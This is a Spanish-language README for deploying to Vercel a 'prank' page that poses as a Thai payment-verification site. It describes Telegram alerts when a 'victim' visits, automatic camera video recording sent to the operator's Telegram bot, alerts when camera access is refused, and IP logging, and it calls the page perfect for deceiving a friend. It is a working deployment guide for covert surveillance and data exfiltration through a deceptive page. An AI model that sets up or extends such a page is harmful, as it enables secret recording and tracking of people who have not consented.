# 🚀 DESPLIEGUE EN VERCEL - INSTRUCCIONES COMPLETAS

## 📋 PASOS PARA DESPLEGAR:

### 1. **Instalar Vercel CLI:**
```bash
npm install -g vercel
```

### 2. **Inicializar Git y subir a GitHub:**
```bash
# En la carpeta del proyecto
git init
git add .
git commit -m "Web broma Thailand para Vercel"

# Crear repositorio en GitHub y conectar
git remote add origin https://github.com/tu-usuario/web-broma-thailand
git push -u origin main
```

### 3. **Desplegar con Vercel:**
```bash
# En la carpeta del proyecto
vercel

# Seguir las instrucciones:
# - Set up and deploy? [Y/n] Y
# - Which scope? [tu-usuario]
# - Link to existing project? [y/N] N
# - What's your project's name? web-broma-thailand
# - In which directory is your code located? ./
```

### 4. **Configurar Variables de Entorno:**

Después del primer deploy, configura las variables:

```bash
# Configurar Bot Token
vercel env add TELEGRAM_BOT_TOKEN

# Cuando te pregunte el valor, pega tu token:
# 123456789:ABCdefGHIjklMNOpqrsTUVwxyz

# Configurar Chat ID
vercel env add TELEGRAM_CHAT_ID

# Cuando te pregunte el valor, pega tu chat ID:
# 12075234
```

### 5. **Redesplegar con las variables:**
```bash
vercel --prod
```

## 🎯 **URLs QUE TENDRÁS:**

- **Página principal:** `https://tu-proyecto.vercel.app`
- **API Video:** `https://tu-proyecto.vercel.app/api/upload-video`
- **API Cámara:** `https://tu-proyecto.vercel.app/api/log-camera-denied`

## 🤖 **CONFIGURACIÓN TELEGRAM:**

### Tu configuración actual:
```
TELEGRAM_BOT_TOKEN = (tu token de @BotFather)
TELEGRAM_CHAT_ID = 12075234
```

### Verificar que funciona:
1. Visita tu URL de Vercel
2. Deberías recibir mensaje en Telegram
3. Activa la cámara y graba
4. Deberías recibir el video en Telegram

## 📱 **VENTAJAS DE VERCEL:**

✅ **HTTPS automático** (necesario para cámara)
✅ **Deploy automático** desde GitHub
✅ **Gratis** para uso personal
✅ **Rápido** (CDN global)
✅ **Fácil** configuración de variables
✅ **Serverless** (no se "duerme")

## 🔧 **COMANDOS ÚTILES:**

### Ver logs:
```bash
vercel logs
```

### Ver información del proyecto:
```bash
vercel inspect
```

### Cambiar variables:
```bash
vercel env rm TELEGRAM_BOT_TOKEN
vercel env add TELEGRAM_BOT_TOKEN
```

### Deploy de producción:
```bash
vercel --prod
```

## 🎭 **COMO FUNCIONA:**

1. **Víctima entra** → Recibe notificación en Telegram
2. **Acepta cámara** → Se graba video automáticamente
3. **Video se procesa** → Se envía a tu Telegram
4. **Niega cámara** → Recibe alerta en Telegram

## ⚠️ **IMPORTANTE:**

- Los videos NO se guardan en Vercel (se envían directamente a Telegram)
- Las funciones son serverless (más rápido)
- Configurar BIEN las variables de entorno
- Verificar que el bot tenga permisos

## 🐛 **SOLUCIÓN DE PROBLEMAS:**

### **Video no se envía:**
```bash
vercel logs --follow
```
Buscar errores en los logs

### **Telegram no funciona:**
Verificar variables:
```bash
vercel env ls
```

### **Cámara no funciona:**
- Verificar que la URL sea HTTPS
- Probar en diferentes navegadores

## 🎉 **¡LISTO!**

Una vez configurado, tendrás:
- ✅ URL bonita de Vercel
- ✅ Notificaciones en Telegram
- ✅ Videos enviados automáticamente
- ✅ Registro de IPs
- ✅ Todo funcionando 24/7

**URL ejemplo:** `https://pago-thailand-verificar.vercel.app`

¡Perfecta para engañar a tu amigo! 😈 